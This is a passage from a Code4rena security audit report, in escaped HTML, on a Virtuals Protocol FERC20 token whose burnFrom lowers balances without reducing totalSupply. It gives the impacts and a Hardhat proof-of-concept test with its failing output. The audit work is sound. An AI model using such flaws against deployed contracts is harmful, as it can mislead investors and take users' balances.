href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-425\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-825\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-754\"\u003eSilverwind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-670\"\u003eunique\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-686\"\u003eX-Tray03\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FERC20.sol#L136\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-5\" aria-label=\"finding description 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eburnFrom\u003c/code\u003e (address user, uint256 amount) function in the FERC20 contract allows the owner to decrease a user’s balance and emit a Transfer (user, \u003ccode\u003eaddress(0)\u003c/code\u003e, amount) event — simulating a burn. However, it fails to reduce the \u003ccode\u003e_totalSupply\u003c/code\u003e variable. This violates the ERC20 standard and creates an inconsistency between on-chain total supply and actual circulating tokens.\u003c/p\u003e\n\u003ch3 id=\"impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis vulnerability has significant consequences:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eERC20 Standard Violation:\u003c/strong\u003e Tools, protocols, and dApps relying on \u003ccode\u003etotalSupply()\u003c/code\u003e will receive incorrect data.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMarket Cap Manipulation:\u003c/strong\u003e Since market cap is often calculated as \u003ccode\u003eprice * totalSupply\u003c/code\u003e, an attacker can make the market cap appear larger than reality, misleading investors and platforms.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDeFi Exploits:\u003c/strong\u003e Protocols that distribute rewards or voting power proportionally to \u003ccode\u003etotalSupply\u003c/code\u003e or \u003ccode\u003ebalance/totalSupply\u003c/code\u003e ratios may be gamed.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFalse Burn Signals:\u003c/strong\u003e The Transfer event to the zero address signals a burn, while the tokens still exist in the \u003ccode\u003etotalSupply\u003c/code\u003e, creating a false narrative of scarcity.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCentralization Risk:\u003c/strong\u003e The owner can arbitrarily remove user balances (burn) while keeping \u003ccode\u003etotalSupply\u003c/code\u003e unchanged, retaining apparent token value but harming users.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis combination creates both economic manipulation risk and false transparency, which can impact DeFi, governance, analytics, and user trust.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-11\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Run Test\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003enpx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ehardhat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexploits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ejs\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// POC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FunToken\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FUN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;1000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewaitForDeployment\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;should not reduce totalSupply when using burnFrom (BUG)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Burn tokens from addr1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddr1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;50\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Esto debería fallar porque totalSupply no cambió\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;- test para detectar el bug\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// output\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereduce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eusing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBUG\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epassing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (2\u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efailing\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereduce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eusing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBUG\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e):\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  AssertionError: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000000000000000000000000000000000000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebelow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000000000000000000000000000000000000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"explanation\" style=\"position:relative;\"\u003e\u003ca href=\"#explanation\" aria-label=\"explanation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 